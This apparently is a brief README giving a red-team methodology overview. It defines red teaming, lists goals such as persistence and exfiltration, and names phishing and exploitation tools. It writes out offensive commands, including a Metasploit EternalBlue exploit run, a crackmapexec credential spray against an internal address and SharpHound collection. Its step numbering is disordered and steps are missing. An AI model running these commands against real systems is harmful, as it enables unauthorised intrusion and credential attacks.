# Red Hat-Hacking
üõ°Ô∏è Red Hat Hacking Methodology &amp; Roadmap


# Who is a Red Hat Hacker?
Red Teaming is a full-scope, adversary simulation exercise aimed at testing the detection and response capabilities of an organization‚Äôs people, processes, and technology. Unlike penetration testing, it‚Äôs not just about finding vulnerabilities ‚Äî it‚Äôs about emulating real-world threat actors to test defenses end-to-end.

# üß† Red Team Objectives
- Bypass perimeter and internal defenses.
- Establish persistence.
- Escalate privileges.
- Exfiltrate data.
- Avoid detection.
- Test blue team‚Äôs monitoring and response.

# üîÄ Red Teaming vs. Pentesting vs. Blue Teaming
| Aspect  | Red Teaming                  | Penetration Testing          | Blue Teaming               |
| ------- | ---------------------------- | ---------------------------- | -------------------------- |
| Focus   | Attack simulation            | Vulnerability identification | Detection & defense        |
| Scope   | Full (people, tech, process) | Narrow (technical only)      | Entire infrastructure      |
| Stealth | High (evasion required)      | None (often noisy)           | High                       |
| Goal    | Real-world emulation         | Security flaw identification | Identify, respond, recover |

**Tools:**
Gophish, Evilginx, KingPhisher
Metasploit, MSFVenom, Nishang
CVE Exploits (CVE-2024-*)

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue

run
```

# üß® Step 3: Exploitation (Web, Infra, AD)
‚úÖ Objective: Exploit known/unknown vulnerabilities.

1. Web Exploits:

```
crackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt
```

3. Active Directory:

* ```BloodHound, SharpHound, ADEnum, Kerbrute```

```
SharpHound.exe -c all
```

4. CVE Hunting:

* ```searchsploit apache 2.4.49```
